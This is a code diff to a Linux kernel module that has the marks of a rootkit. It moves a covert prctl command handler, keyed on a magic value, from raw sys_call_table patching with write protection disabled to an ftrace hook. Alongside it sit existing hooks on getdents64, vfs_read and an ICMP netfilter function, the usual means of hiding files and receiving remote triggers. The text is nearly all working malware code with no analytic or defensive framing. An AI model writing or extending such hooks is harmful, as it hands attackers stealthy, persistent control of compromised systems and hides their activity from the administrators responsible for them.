@@ -1007,9 +1007,13 @@ static unsigned int icmp_hook_func(void *priv, struct sk_buff *skb,
 }
 
 // ============= ftrace hooks =============
+static asmlinkage long (*orig_prctl)(const struct pt_regs *);
+static asmlinkage long hk_prctl(const struct pt_regs *regs);
+
 static struct ftrace_hook hooks[] = {
     { .name = "__x64_sys_getdents64", .hook = hook_getdents64, .orig = &orig_getdents64 },
     { .name = "vfs_read", .hook = hook_vfs_read, .orig = &orig_vfs_read },
+    { .name = "__x64_sys_prctl", .hook = hk_prctl, .orig = &orig_prctl },
 };
 
 #define HOOKS_COUNT ARRAY_SIZE(hooks)
@@ -1051,14 +1055,14 @@ static unsigned long *sct = NULL;
 
 #define PRCTL_MAGIC 0x564C  // "VL" in hex
 
-static asmlinkage long (*orig_prctl)(int option, unsigned long arg2,
-                                     unsigned long arg3, unsigned long arg4,
-                                     unsigned long arg5);
-
-static asmlinkage long hk_prctl(int option, unsigned long arg2,
-                                unsigned long arg3, unsigned long arg4,
-                                unsigned long arg5)
+static asmlinkage long hk_prctl(const struct pt_regs *regs)
 {
+    int option   = (int)regs->di;
+    unsigned long arg2 = regs->si;
+    unsigned long arg3 = regs->dx;
+    unsigned long arg4 = regs->r10;
+    unsigned long arg5 = regs->r8;
+
     if (option == PRCTL_MAGIC) {
         int cmd = (int)arg2;
         unsigned long val = arg3;
@@ -1120,31 +1124,7 @@ static asmlinkage long hk_prctl(int option, unsigned long arg2,
         }
     }
     
-    return orig_prctl(option, arg2, arg3, arg4, arg5);
-}
-
-static bool prctl_hooked = false;
-
-static void setup_prctl_hook(void)
-{
-    sct = (unsigned long *)lookup_name("sys_call_table");
-    if (!sct) return;
-    
-    orig_prctl = (void *)sct[__NR_prctl];
-    disable_wp();
-    sct[__NR_prctl] = (unsigned long)hk_prctl;
-    enable_wp();
-    prctl_hooked = true;
-}
-
-static void cleanup_prctl_hook(void)
-{
-    if (prctl_hooked && sct && orig_prctl) {
-        disable_wp();
-        sct[__NR_prctl] = (unsigned long)orig_prctl;
-        enable_wp();
-        prctl_hooked = false;
-    }
+    return orig_prctl(regs);
 }
 
 // ============= Module init/exit =============
@@ -1166,6 +1146,8 @@ static int __init mod_init(void)
             // Fallback for older kernel naming
             if (strcmp(hooks[i].name, "__x64_sys_getdents64") == 0)
                 hooks[i].addr = lookup_name("ksys_getdents64");
+            else if (strcmp(hooks[i].name, "__x64_sys_prctl") == 0)
+                hooks[i].addr = lookup_name("sys_prctl");
         }
         if (hooks[i].addr)
             install_ftrace_hook(&hooks[i]);
@@ -1221,7 +1203,7 @@ static void __exit mod_exit(void)
     int i;
     
     g_data.active = false;
-    
+
     // Cleanup seq_show kretprobes
     remove_seq_hooks();
     
